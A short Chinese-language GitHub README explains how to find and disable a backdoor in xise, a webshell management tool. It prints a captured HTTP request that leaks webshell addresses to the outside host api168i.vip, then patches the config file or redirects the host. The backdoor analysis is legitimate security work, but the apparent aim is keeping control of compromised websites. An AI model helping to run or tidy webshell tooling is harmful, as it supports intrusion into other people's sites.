# securitydrops
These are some things encountered on the road to making money, converted into articles

## xise后门去除**

工具来源：https://webshell6.com/?id=4

准备工具：WSExokrer、c32asm

![image](https://github.com/hcsmall/securitydrops/assets/139908133/ae36239a-069b-4150-8a86-11dde98b7007)


启动程序后使用WSExokrer 选择xise进程监控，给XISE添加一条链接

![image](https://github.com/hcsmall/securitydrops/assets/139908133/51b83c3e-e2c0-4680-933c-6b2e37454e4e)




POST /abc1.php HTTP/1.1
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
Referer: http://api168i.vip/abc1.php
Accept-Language: zh-cn
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: api168i.vip
Cache-Control: no-cache

hm=http://xxxx/bak111.php||xise



可以看到向api168i.vip 发送了明显的shell数据，找到后就可以去找后门地址去掉就可以了。

mdb 数据库文件

exe本身

调用文件dat

使用c32asm加载fz.dat这个配置文件，搜索api168i.vip。



![image](https://github.com/hcsmall/securitydrops/assets/139908133/9ed2afdf-3f46-4183-8cda-74acd6b7427c)




将地址直接填充后保存即可。

当然如果你不会使用c32的话，也可以修改本地hosts文件将 api168i.vip 指向127.0.0.1 同样也可以解决向后门地址发送shell的问题

